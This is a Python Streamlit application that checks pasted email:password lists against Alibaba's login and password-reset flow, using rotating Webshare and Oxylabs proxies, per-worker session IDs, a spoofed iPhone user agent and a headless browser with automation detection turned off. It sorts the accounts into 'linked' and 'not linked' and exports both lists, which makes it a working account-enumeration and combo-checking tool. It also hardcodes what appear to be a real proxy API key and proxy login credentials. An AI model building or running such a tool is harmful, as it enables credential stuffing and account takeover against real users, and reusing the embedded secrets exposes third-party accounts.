import streamlit as st
import asyncio
import os
import random
import uuid
import time
import requests
from datetime import datetime
from playwright.async_api import async_playwright
import nest_asyncio

nest_asyncio.apply()

# Page Configuration
st.set_page_config(
    page_title="Positive Alibaba Checker",
    page_icon="📦",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.title("📦 Positive Alibaba Checker Hub")
st.caption("Automated Alibaba account existence checker with proxy manager & Streamlit dashboard.")

# Initialize Session State
if "proxy_logs" not in st.session_state:
    st.session_state.proxy_logs = []
if "checker_logs" not in st.session_state:
    st.session_state.checker_logs = []
if "alibaba_results" not in st.session_state:
    st.session_state.alibaba_results = {"linked": [], "not_linked": [], "errors": []}

# Constants
LOGIN_URL = "https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&lang=en_US"

# Helper to log messages to screen state
def add_checker_log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S")
    entry = f"[{timestamp}] {msg}"
    st.session_state.checker_logs.append(entry)

# --- Helper Functions for Secrets Parsing ---
def get_secrets_webshare_keys():
    if "WEBSHARE_KEYS" in st.secrets:
        raw = st.secrets["WEBSHARE_KEYS"]
        return [k.strip() for k in raw.strip().splitlines() if k.strip()]
    return ["ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo"]

def get_secrets_oxylabs_proxies():
    if "OXYLABS_BASE" in st.secrets:
        raw = st.secrets["OXYLABS_BASE"]
        return [p.strip() for p in raw.strip().splitlines() if p.strip()]
    return ["user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000"]

def parse_proxy(proxy_str):
    proxy_str = (proxy_str or "").strip()
    if not proxy_str:
        return None
    if "@" in proxy_str:
        return f"http://{proxy_str}"
    return None

def test_proxy(proxy_str):
    try:
        proxy = parse_proxy(proxy_str)
        if not proxy:
            return False
        r = requests.get("https://api.ipify.org?format=json", proxies={"http": proxy, "https": proxy}, timeout=6)
        return r.status_code == 200
    except Exception:
        return False

def get_geo(proxy_str):
    proxy = parse_proxy(proxy_str)
    if not proxy:
        return "-", "-"
    try:
        r = requests.get("http://ip-api.com/json/", proxies={"http": proxy, "https": proxy}, timeout=6)
        data = r.json()
        return data.get("country", "-"), data.get("city", "-")
    except Exception:
        return "-", "-"

def load_webshare(api_keys):
    info, out = {}, []
    for api_key in api_keys:
        if not api_key.strip():
            continue
        try:
            headers = {"Authorization": f"Token {api_key.strip()}"}
            page = 1
            while page <= 10:
                url = f"https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page={page}&page_size=100"
                r = requests.get(url, headers=headers, timeout=15)
                if r.status_code != 200:
                    break
                data = r.json()
                items = data.get("results", [])
                if not items:
                    break
                for it in items:
                    try:
                        line = f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}"
                        out.append(line)
                        info[line] = (str(it.get("country_code") or "-"), str(it.get("city_name") or "-"))
                    except Exception:
                        continue
                if not data.get("next"):
                    break
                page += 1
        except Exception:
            continue
    return list(dict.fromkeys(out)), info

# --- Sidebar Configuration ---
st.sidebar.header("⚙️ Configuration Hub")

webshare_keys_env = get_secrets_webshare_keys()
oxylabs_proxies_env = get_secrets_oxylabs_proxies()

st.sidebar.success(f"Loaded {len(webshare_keys_env)} Webshare Keys & {len(oxylabs_proxies_env)} Oxylabs Proxies from Secrets.")

custom_key_input = st.sidebar.text_area("Webshare API Keys Override (1 per line)", value="\n".join(webshare_keys_env), height=100)
max_workers = st.sidebar.slider("Worker Threads", 1, 10, 3)

# Account Input Section
st.sidebar.markdown("---")
st.sidebar.header("📋 Accounts Input")
accounts_input = st.sidebar.text_area(
    "Paste accounts (email:password)",
    value="example1@domain.com:password123\nexample2@domain.com:password456",
    height=150
)

# --- Main Dashboard Tabs ---
tab1, tab2, tab3 = st.tabs(["🌐 Proxy Manager", "🚀 Alibaba Checker", "📁 Results & Export"])

with tab1:
    st.subheader("Webshare & Oxylabs Proxy Loader & Tester")
    if st.button("🔄 Fetch & Test Live Proxies", type="primary"):
        st.session_state.proxy_logs = []
        keys_to_use = [k.strip() for k in custom_key_input.strip().splitlines() if k.strip()]
        
        with st.spinner("Fetching Webshare proxies and testing connections..."):
            webshare_list, api_info = load_webshare(keys_to_use)
            all_proxies = list(dict.fromkeys(oxylabs_proxies_env + webshare_list))
            
            live = []
            log_entries = []
            for p in all_proxies:
                short = p.split("@")[-1]
                if test_proxy(p):
                    live.append(p)
                    country, city = api_info.get(p) or get_geo(p)
                    log_entries.append(f"✅ Alive → {short} | Country: {country} | City: {city}")
                else:
                    log_entries.append(f"❌ Skip → {short} (Dead)")
            
            with open("proxies.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(live))
            
            st.session_state.proxy_logs = log_entries
            st.success(f"Proxy test complete! Found {len(live)} alive proxies saved to proxies.txt.")

    if st.session_state.proxy_logs:
        st.code("\n".join(st.session_state.proxy_logs), language="text")

with tab2:
    st.subheader("Alibaba Existence & Status Checker Engine")
    
    accounts = [l.strip() for l in accounts_input.strip().splitlines() if l.strip() and ":" in l]
    st.info(f"Loaded **{len(accounts)}** valid account combos ready for checking.")

    if st.button("🚀 Start Alibaba Checker", type="primary"):
        if not accounts:
            st.warning("Please provide accounts in the sidebar first.")
        else:
            st.session_state.checker_logs = []
            add_checker_log(f"Starting Alibaba Checker engine with {len(accounts)} accounts across {max_workers} worker threads.")

            async def run_checker():
                proxy_file = "proxies.txt"
                alive_proxies = []
                if os.path.exists(proxy_file):
                    with open(proxy_file, encoding="utf-8") as f:
                        alive_proxies = [l.strip() for l in f if l.strip()]
                
                if not alive_proxies:
                    alive_proxies = oxylabs_proxies_env

                proxy_lock = asyncio.Lock()
                result_lock = asyncio.Lock()
                linked_accs, not_linked_accs, error_accs = [], [], []

                def make_oxy(base_proxy):
                    if "@" in base_proxy:
                        user_pass, host = base_proxy.split("@", 1)
                        if ":" in user_pass:
                            user, pwd = user_pass.split(":", 1)
                            return f"{user}-sessid-{uuid.uuid4().hex[:12]}:{pwd}@{host}"
                    return base_proxy

                async def get_proxy():
                    async with proxy_lock:
                        if not alive_proxies:
                            return None
                        p = alive_proxies.pop(0)
                        alive_proxies.append(p)
                        if "oxylabs.io" in p:
                            return make_oxy(p)
                        return p

                def classify(url, text):
                    url, text = (url or "").lower(), (text or "").lower()
                    if ("verify_mode.htm" in url or "token_enter_iv.htm" in url or "iv_token=" in url or "get code" in text):
                        return "linked", "Verification page reached"
                    if "account does not exist" in text or "please enter a valid email" in text:
                        return "not_linked", "Account does not exist text detected"
                    if "captcha" in text or "blocked" in text:
                        return "error", "Captcha or IP block detected"
                    return None, None

                async def check_account(worker_id, page, email):
                    try:
                        add_checker_log(f"[Worker-{worker_id}] Navigating to login portal for: {email}")
                        await page.goto(LOGIN_URL, wait_until="domcontentloaded", timeout=35000)
                        await asyncio.sleep(1.0)
                        
                        btn = page.locator('text="Continue with email"')
                        if await btn.count() > 0:
                            add_checker_log(f"[Worker-{worker_id}] Clicking 'Continue with email' button...")
                            await btn.first.click(timeout=5000)
                        await asyncio.sleep(1.0)
                        
                        inp = page.locator('input[type="email"], input[type="text"]')
                        if await inp.count() > 0:
                            add_checker_log(f"[Worker-{worker_id}] Entering email address into form...")
                            await inp.first.fill(email, timeout=5000)
                        
                        fp = page.locator('text="Forgot password?"')
                        if await fp.count() > 0:
                            add_checker_log(f"[Worker-{worker_id}] Clicking 'Forgot password?' trigger...")
                            await fp.first.click(timeout=5000)
                        await asyncio.sleep(1.0)
                        
                        end_time = time.time() + 6.0
                        while time.time() < end_time:
                            current_url = page.url
                            body_text = await page.inner_text("body")
                            status, detail = classify(current_url, body_text)
                            if status:
                                add_checker_log(f"[Worker-{worker_id}] Classified [{email}] → Status: {status.upper()} ({detail})")
                                return status, detail
                            await asyncio.sleep(0.3)
                        
                        add_checker_log(f"[Worker-{worker_id}] Classification timeout for [{email}] on URL: {page.url[:60]}")
                        return "error", "Timeout / Unknown State"
                    except Exception as e:
                        err_str = str(e)[:80]
                        add_checker_log(f"[Worker-{worker_id}] Exception evaluating [{email}]: {err_str}")
                        return "error", err_str

                async def worker(worker_id, browser, queue):
                    raw_proxy = await get_proxy()
                    parsed = f"http://{raw_proxy}" if raw_proxy and "@" in raw_proxy else None
                    add_checker_log(f"[Worker-{worker_id}] Initialized with proxy: {raw_proxy.split('@')[-1] if raw_proxy else 'None'}")
                    
                    context = await browser.new_context(
                        viewport={"width": 390, "height": 844},
                        user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
                        is_mobile=True, proxy={"server": parsed} if parsed else None
                    )
                    page = await context.new_page()

                    while not queue.empty():
                        idx, line = await queue.get()
                        email = line.split(":", 1)[0].strip()
                        status, detail = await check_account(worker_id, page, email)
                        
                        async with result_lock:
                            if status == "linked":
                                linked_accs.append(line)
                            elif status == "not_linked":
                                not_linked_accs.append(line)
                            else:
                                error_accs.append(f"{line} # {detail}")
                        queue.task_done()
                    await context.close()

                async with async_playwright() as p:
                    add_checker_log("Launching Playwright Chromium browser instance...")
                    browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-blink-features=AutomationControlled"])
                    queue = asyncio.Queue()
                    for idx, line in enumerate(accounts, 1):
                        await queue.put((idx, line))

                    workers = [asyncio.create_task(worker(i + 1, browser, queue)) for _ in range(max_workers)]
                    await queue.join()
                    await asyncio.gather(*workers)
                    await browser.close()
                    add_checker_log("Playwright browser instance closed. Checker complete.")

                return {"linked": linked_accs, "not_linked": not_linked_accs, "errors": error_accs}

            with st.spinner("Running asynchronous Alibaba account verification..."):
                results = asyncio.run(run_checker())
                st.session_state.alibaba_results = results
                st.success("Checker execution complete!")

    # Live session metrics
    res = st.session_state.alibaba_results
    m1, m2, m3 = st.columns(3)
    m1.metric("✅ Linked Accounts", len(res["linked"]))
    m2.metric("❌ Not Linked", len(res["not_linked"]))
    m3.metric("⚠️ Errors", len(res["errors"]))

    # Detailed Real-Time Diagnostic Screen
    st.markdown("---")
    with st.expander("🔍 Real-time Checker Diagnostic Logs", expanded=True):
        if st.session_state.checker_logs:
            st.code("\n".join(st.session_state.checker_logs), language="text")
        else:
            st.caption("Diagnostic logs will appear here during execution.")

with tab3:
    st.subheader("Export Results")
    res = st.session_state.alibaba_results
    
    if res["linked"]:
        st.markdown("### Linked Accounts")
        st.code("\n".join(res["linked"]), language="text")
        st.download_button("Download Linked TXT", "\n".join(res["linked"]), file_name="linked_accounts.txt", mime="text/plain")

    if res["not_linked"]:
        st.markdown("### Not Linked Accounts")
        st.code("\n".join(res["not_linked"]), language="text")
        st.download_button("Download Not Linked TXT", "\n".join(res["not_linked"]), file_name="not_linked_accounts.txt", mime="text/plain")
